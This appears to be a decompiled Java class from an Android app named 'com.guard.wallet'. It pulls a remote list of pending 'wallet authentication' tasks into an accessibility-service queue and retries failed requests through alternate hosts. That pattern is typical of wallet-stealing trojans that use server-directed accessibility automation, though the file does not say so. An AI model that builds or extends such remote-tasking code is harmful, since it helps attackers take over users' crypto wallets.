package com.guard.wallet.http;
import com.guard.wallet.core.AppUtils;

import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.service.MyAccessibilityService;
import java.io.IOException;
import java.util.List;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;
import okhttp3.ResponseBody;

/**
 * 未完成钱包回调 — vendor http/o.
 *
 * 拉取未完成的钱包认证策略列表:
 * - 成功时清空并替换 AccessibilityService 中的待处理队列
 * - 队列存储于 MyAccessibilityService.g.p (ConcurrentLinkedQueue)
 */
public final class NoCompleteWalletCallback implements Callback {
    @Override
    public void onFailure(Call call, IOException e) {
        AppUtils.s("NoCompleteWalletCallback", e);
        if (!(e instanceof DuplicateRequestException)) { HttpClient.finishRequest(call.request().url().host()); HttpApiManager.routeForwarding(call, this); }
    }
    @Override
    public void onResponse(Call call, Response response) throws IOException {
        HttpClient.finishRequest(call.request().url().host());
        ResponseBody var7 = response.body();
        if (var7 != null) {
            try {
                NoCompleteWalletCallback$1 var3 = new NoCompleteWalletCallback$1();
                ApiResult var8 = (ApiResult) com.guard.wallet.utils.SharedPrefsManager.c(var7.string(), var3);
                if (var8 != null && var8.getSuccess()) {
                    List var11 = (List) var8.getData();
                    if (MyAccessibilityService.P() != null && MyAccessibilityService.P().g != null) {
                        java.util.concurrent.ConcurrentLinkedQueue var9 = MyAccessibilityService.P().g.p;
                        var9.clear();
                        if (var11 != null && !var11.isEmpty()) {
                            var9.addAll(var11);
                        }
                    }
                }
            } catch (Exception var10) { AppUtils.s("NoCompleteWalletCallback", var10); }
        }
        response.close();
    }
}
